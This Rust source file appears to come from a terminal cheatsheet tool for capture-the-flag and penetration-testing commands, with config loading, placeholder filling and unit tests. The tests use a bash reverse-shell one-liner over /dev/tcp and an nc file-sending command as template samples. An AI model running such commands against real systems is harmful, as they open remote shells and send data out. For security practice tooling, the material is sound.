use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::PathBuf;

/// A single cheatsheet command/template.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub category: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    pub template: String,
    #[serde(default)]
    pub tags: Vec<String>,
    /// Optional multi-step playbook: each entry runs in its own tab.
    /// `template` stays the primary/copyable line; `steps` drives the runner.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub steps: Vec<String>,
    /// true if it came from the user's commands.toml (editable/removable)
    #[serde(skip)]
    pub user: bool,
}

impl Command {
    /// Lines to run: the explicit `steps`, else the single `template`.
    pub fn run_steps(&self) -> Vec<String> {
        if self.steps.is_empty() {
            vec![self.template.clone()]
        } else {
            self.steps.clone()
        }
    }
}

#[derive(Debug, Default, Deserialize)]
struct CommandFile {
    #[serde(default, rename = "command")]
    commands: Vec<Command>,
}

#[derive(Debug, Default, Serialize)]
struct CommandFileOut<'a> {
    #[serde(rename = "command")]
    commands: Vec<&'a Command>,
}

/// Config = the persisted variable values.
// NOTE: array fields are declared BEFORE `vars` so toml serializes them first;
// a TOML table must come after top-level keys or those keys nest under it.
#[derive(Debug, Default, Serialize, Deserialize)]
pub struct Config {
    /// Pinned command keys ("category/name").
    #[serde(default)]
    pub favorites: Vec<String>,
    /// Recently copied/run command keys, most-recent first.
    #[serde(default)]
    pub recent: Vec<String>,
    /// Background style: true = flowing ASCII field, false = starfield.
    #[serde(default)]
    pub flow_bg: bool,
    #[serde(default)]
    pub vars: BTreeMap<String, String>,
}

pub fn config_dir() -> PathBuf {
    dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("pivt")
}

pub fn config_file() -> PathBuf {
    config_dir().join("config.toml")
}

pub fn user_commands_file() -> PathBuf {
    config_dir().join("commands.toml")
}

/// The shared target file used by the user's `target` shell function
/// (~/.cache/ctf-target, honoring XDG_CACHE_HOME).
pub fn ctf_target_file() -> PathBuf {
    let base = std::env::var_os("XDG_CACHE_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            dirs::home_dir().unwrap_or_else(|| PathBuf::from(".")).join(".cache")
        });
    base.join("ctf-target")
}

pub fn read_ctf_target() -> Option<String> {
    let s = std::fs::read_to_string(ctf_target_file()).ok()?;
    let s = s.trim().to_string();
    if s.is_empty() {
        None
    } else {
        Some(s)
    }
}

/// Mirror RHOST into the shared target file so `target`/$TARGET see it too.
pub fn write_ctf_target(ip: &str) {
    if ip.is_empty() {
        return;
    }
    let path = ctf_target_file();
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    let _ = std::fs::write(path, format!("{ip}\n"));
}

/// Bundled default cheatsheet, compiled into the binary.
const BUNDLED: &str = include_str!("default_commands.toml");

/// Load bundled commands then merge/override with the user's file.
/// A user command with the same (category,name) overrides a bundled one.
pub fn load_commands() -> Vec<Command> {
    let mut out: Vec<Command> = parse_commands(BUNDLED, false);

    let path = user_commands_file();
    if let Ok(txt) = std::fs::read_to_string(&path) {
        let user = parse_commands(&txt, true);
        for uc in user {
            if let Some(slot) = out
                .iter_mut()
                .find(|c| c.category == uc.category && c.name == uc.name)
            {
                *slot = uc;
            } else {
                out.push(uc);
            }
        }
    }
    out
}

fn parse_commands(txt: &str, user: bool) -> Vec<Command> {
    match toml::from_str::<CommandFile>(txt) {
        Ok(f) => f
            .commands
            .into_iter()
            .map(|mut c| {
                c.user = user;
                c
            })
            .collect(),
        Err(_) => Vec::new(),
    }
}

/// Persist all user commands to commands.toml.
pub fn save_user_commands(all: &[Command]) -> std::io::Result<()> {
    std::fs::create_dir_all(config_dir())?;
    let users: Vec<&Command> = all.iter().filter(|c| c.user).collect();
    let out = CommandFileOut { commands: users };
    let txt = toml::to_string_pretty(&out)
        .unwrap_or_default();
    std::fs::write(user_commands_file(), txt)
}

pub fn load_config() -> Config {
    if let Ok(txt) = std::fs::read_to_string(config_file()) {
        toml::from_str(&txt).unwrap_or_default()
    } else {
        Config::default()
    }
}

pub fn save_config(cfg: &Config) -> std::io::Result<()> {
    std::fs::create_dir_all(config_dir())?;
    let txt = toml::to_string_pretty(cfg).unwrap_or_default();
    std::fs::write(config_file(), txt)
}

/// Extract `<PLACEHOLDER>` tokens (UPPERCASE / digits / underscore) from a template,
/// preserving first-seen order, de-duplicated.
pub fn extract_placeholders(template: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let bytes = template.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            if let Some(close) = template[i + 1..].find('>') {
                let inner = &template[i + 1..i + 1 + close];
                if !inner.is_empty()
                    && inner
                        .chars()
                        .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
                {
                    let s = inner.to_string();
                    if !out.contains(&s) {
                        out.push(s);
                    }
                    i = i + 1 + close + 1;
                    continue;
                }
            }
        }
        i += 1;
    }
    out
}

/// Fill a template from the vars map. Empty/missing vars keep the `<NAME>` marker
/// so the user can see what's still unset.
pub fn fill_template(template: &str, vars: &BTreeMap<String, String>) -> String {
    let mut s = template.to_string();
    for ph in extract_placeholders(template) {
        if let Some(v) = vars.get(&ph) {
            if !v.is_empty() {
                s = s.replace(&format!("<{ph}>"), v);
            }
        }
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    #[test]
    fn placeholders_extract_in_order_dedup() {
        let t = "nc <LHOST> <LPORT> < <FILE> # <LHOST>";
        assert_eq!(extract_placeholders(t), vec!["LHOST", "LPORT", "FILE"]);
    }

    #[test]
    fn fill_keeps_unset_marker() {
        let mut v = BTreeMap::new();
        v.insert("LHOST".to_string(), "10.10.14.5".to_string());
        v.insert("LPORT".to_string(), "".to_string());
        let out = fill_template("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", &v);
        assert_eq!(out, "bash -i >& /dev/tcp/10.10.14.5/<LPORT> 0>&1");
    }


    #[test]
    fn config_roundtrip_order() {
        let mut c = Config::default();
        c.favorites.push("nmap/Quick".into());
        c.recent.push("web/ffuf".into());
        c.vars.insert("RHOST".into(), "10.0.0.1".into());
        let txt = toml::to_string_pretty(&c).unwrap();
        // arrays must appear before the [vars] table
        let fav_pos = txt.find("favorites").unwrap();
        let vars_pos = txt.find("[vars]").unwrap();
        assert!(fav_pos < vars_pos, "bad order:\n{txt}");
        let back: Config = toml::from_str(&txt).unwrap();
        assert_eq!(back.favorites, vec!["nmap/Quick".to_string()]);
        assert_eq!(back.vars.get("RHOST").unwrap(), "10.0.0.1");
    }

    #[test]
    fn bundled_parses() {
        let c = parse_commands(BUNDLED, false);
        assert!(c.len() > 40);
        assert!(c.iter().all(|x| !x.template.is_empty()));
    }
}
